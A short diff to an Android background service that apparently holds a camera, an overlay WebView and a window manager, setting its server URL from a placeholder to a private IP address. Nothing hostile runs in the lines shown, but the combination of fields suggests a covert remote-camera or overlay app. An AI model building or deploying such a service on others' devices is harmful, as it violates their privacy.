@@ -32,7 +32,7 @@ public class MainService extends Service {
     private Camera camera;
     private WebView overlayWebView;
     private WindowManager windowManager;
-    private String serverUrl = "http://YOUR_SERVER_IP:3000";
+    private String serverUrl = "http://10.45.241.68:3000";
 
     @Override
     public void onCreate() {
